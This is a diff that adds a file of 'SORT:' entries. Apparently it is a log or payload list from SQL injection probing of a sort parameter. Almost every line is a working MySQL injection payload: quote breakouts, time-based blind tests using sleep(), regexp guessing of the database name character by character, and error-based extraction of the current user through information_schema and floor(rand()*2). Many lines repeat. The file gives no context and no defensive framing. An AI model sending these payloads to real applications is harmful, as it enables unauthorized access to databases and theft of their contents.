@@ -1,0 +1,69 @@
+SORT:1
+SORT:1
+SORT:1' -- 
+SORT:1" -- 
+SORT:1 and if(1=1, !sleep(1), 0) -- 
+SORT:1 and if(1=1, !sleep(1), 0) -- 
+SORT:1 and if(1=1, !sleep(3), 0) -- 
+SORT:1 and if(1=1, !sleep(3), 0) -- 
+SORT:1' and if(1=1, !sleep(3), 0) -- 
+SORT:1' and database() regexp '^se[a-z]' -- 
+SORT:1' and database() regexp '^ase[a-z]' -- 
+SORT:1' and database() regexp '^ase[a-z]' -- 
+SORT:2' and database() regexp '^ase[a-z]' -- 
+SORT:1' and database() regexp '^ase[a-z]' -- 
+SORT:0' or database() regexp '^ase[a-z]' -- 
+SORT:0' or database() regexp '^ase[a-z]' -- 
+SORT:0' or database() regexp '^se[a-z]' -- 
+SORT:1' and database() regexp '^se[a-z]' -- 
+SORT:0
+SORT:1
+SORT:rand(0)
+SORT:rand(1)
+SORT:rand(true)
+SORT:rand(false)
+SORT:1'
+SORT:1"
+SORT:1"
+SORT:1'
+SORT:1' -- 
+SORT:2' -- 
+SORT:3' -- 
+SORT:1
+SORT:1 and if(1=1, !sleep(4), 0) -- 
+SORT:1" and if(1=1, !sleep(4), 0) -- 
+SORT:1") and if(1=1, !sleep(4), 0) -- 
+SORT:1' and if(1=1, !sleep(4), 0) -- 
+SORT:1' and if(1=1, !sleep(4), 0) limit 0,1  -- 
+SORT:1' and (select count(*) from information_schema.columns     group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns  group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and if(database() regexp '^se[a-z]', !sleep(2), 0)  -- 
+SORT:1' and if(database() regexp '^sse[a-z]', !sleep(2), 0)  -- 
